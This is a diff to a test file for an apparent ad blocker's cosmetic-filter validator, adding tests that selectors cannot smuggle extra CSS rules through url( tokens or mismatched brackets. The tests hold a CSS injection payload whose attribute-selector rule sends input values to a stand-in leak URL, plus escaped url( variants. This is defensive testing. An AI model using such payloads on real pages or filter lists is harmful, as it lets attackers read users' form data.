@@ -35,10 +35,32 @@ test("a selector that could leave its rule is refused", () => {
     "a[href=\"x", "div:not(.a", "a[b", ".a)", ".a,.b", "</style>", `.${"x".repeat(400)}`, ".a\\"]) {
     assert.equal(C.safeSelector(sel), false, JSON.stringify(sel));
   }
-  for (const sel of [".ad", "#ad-top", "div[class^=\"ad-\"]", "a[href*=\"{x};\"]", "div:not(.a, .b) > .c",
+  for (const sel of [".ad", "#ad-top", "div[class^=\"ad-\"]", "a[href*=\"x;y\"]", "div:not(.a, .b) > .c",
     "[style=\"width: 300px; height: 250px;\"]", ".a\\:b", "div:has(> .ad)"]) {
     assert.equal(C.safeSelector(sel), true, sel);
   }
+});
+
+// The validator and Chromium must read a selector the same way. Where they could
+// disagree (a url( token ends at the first ")" whatever quotes it holds; a "(" inside
+// "[" swallows the "]"), the selector is refused outright.
+const INJECT = ":not(url(a\"b)){}body{background:rgb(255,0,0)!important}input[value^=\"s3\"]"
+  + "{background:url(http://127.0.0.1:9/leak?v=s3)}:not(url(c\"d))";
+
+test("a list line cannot smuggle a rule through a url( token or crossed brackets", () => {
+  assert.equal(C.safeSelector(INJECT), false, "the url( desync");
+  assert.equal(C.parseCosmetic(`##${INJECT}`), null);
+  assert.equal(C.safeSelector("a[b(]c)"), false, "crossed brackets swallow the sheet");
+  assert.equal(C.parseCosmetic("##a[b(]c)"), null);
+  for (const sel of ["a:not(url(x))", "a:not(URL(x))", "a:not(u\\72l(x))", "a:not(\\75rl(x))", "a:not(\\55 rl(x))",
+    "a:not(ur\\l(x))", "a:not(ur\\00006c(x))", "a[href*=\"url(\"]", "a(b[c)d]", "a[b]]", "a((b)",
+    "a[href=\"{\"]", "a[href='}']", ".a\\{b", ".a\\}b"]) {
+    assert.equal(C.safeSelector(sel), false, JSON.stringify(sel));
+  }
+  // Nothing of the payload reaches a sheet, and its neighbours still hide.
+  const css = index(["##.ad_banner", `##${INJECT}`, "##a[b(]c)", "##.ad_two"]).cssFor("a.test");
+  assert.equal(css, ".ad_banner,.ad_two{display:none!important}\n");
+  assert.equal((css.match(/[{}]/g) || []).length, 2, "one rule, one pair of braces");
 });
 
 test("a page gets the generic rules plus its site's, minus its exceptions", () => {
